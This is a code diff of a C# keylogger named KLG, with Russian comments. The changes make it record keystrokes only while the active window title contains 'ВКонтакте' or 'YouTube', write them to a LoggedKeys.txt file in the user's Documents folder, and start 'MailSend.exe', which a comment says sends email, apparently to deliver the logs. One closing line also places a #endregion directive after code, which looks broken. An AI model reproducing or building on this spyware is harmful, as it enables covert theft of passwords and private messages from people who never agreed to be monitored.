@@ -6,16 +6,22 @@ using System.Runtime.CompilerServices;
 using System.Threading;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
+using System.Text;
 
 
 namespace KLG
 {
     class Program
     {
-       
-        [DllImport(("User32.dll"))]
+        [DllImport("user32.dll")]
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
-        public static extern int GetAsyncKeyState(Int32 i);
+        [DllImport(("User32.dll"))]
+        public static extern int GetAsyncKeyState(int i);
+
+        [DllImport("User32.dll")]
+        public static extern IntPtr GetForegroundWindow();
+
 
         static void Main(string[] args)
         { 
@@ -27,18 +33,25 @@ namespace KLG
 
         static void LogKeys()
         {
-            
-            String filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-            filePath = filePath + @"\Info\";
-
-            if (!Directory.Exists(filePath))
+            #region Объявление переменных и создание файлов
+            //string exe = Directory.GetCurrentDirectory();
+            //exe += @"\MailSend\MailSend\bin\Debug\MailSend.exe";
+            Process.Start("MailSend.exe"); // Запуск программы для отправки эмайла
+            string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); // Доступ к папке
+            filePath = filePath + @"\Info\"; // Путь к нашей будущей директории
+            const int nChars = 256; // длина строки title
+            IntPtr handle;
+            StringBuilder Buff = new StringBuilder(nChars);
+            KeysConverter converter = new KeysConverter();
+            string text = "";
+            if (!Directory.Exists(filePath)) // Если нету директории, то создаём ее
             {
                 Directory.CreateDirectory(filePath);
             }
 
-            string path = (@filePath + "LoggedKeys.txt");
+            string path = (@filePath + "LoggedKeys.txt"); // путь к нашему файлу с логами
         
-            if (!File.Exists(path))
+            if (!File.Exists(path))// если нету файла, то создаём текстовый документ LoggedKeys
             {
                 using (StreamWriter sw = File.CreateText(path))
                 {
@@ -46,30 +59,36 @@ namespace KLG
                 }
             }
 
-            
-            KeysConverter converter = new KeysConverter();
-            string text = "";
-
-            while (true)
+            #endregion
+            #region Запись в файл
+            while (true) 
             {
-                Thread.Sleep(10);
-                for (int i = 0; i < 2000; i++)
+                
+                handle = GetForegroundWindow();
+                if (GetWindowText(handle, Buff, nChars) > 0)  
                 {
-                    int key = GetAsyncKeyState(i);
-
-                    if (key == 1 || key == -32767)
+                    string line = Buff.ToString();
+                    if (line.Contains("ВКонтакте") || line.Contains("YouTube"))
                     {
-                        text = converter.ConvertToString(i);
-                        using (StreamWriter swf = new StreamWriter(path,true))
+                        Thread.Sleep(10);
+                        for (int i = 0; i < 2000; i++)
                         {
-                            swf.WriteLine(text);
-                            swf.Close();
-                        }
+                            int key = GetAsyncKeyState(i);
 
-                        break;
+                            if (key == 1 || key == -32767)
+                            {
+                                text = converter.ConvertToString(i);
+                                using (StreamWriter swf = new StreamWriter(path, true))
+                                {
+                                    swf.WriteLine(text);
+                                    swf.Close();
+                                }
+                                break;
+                            }
+                        }
                     }
-                }
-            }
-        }
+                } 
+            }               
+        }   #endregion
     }
 }
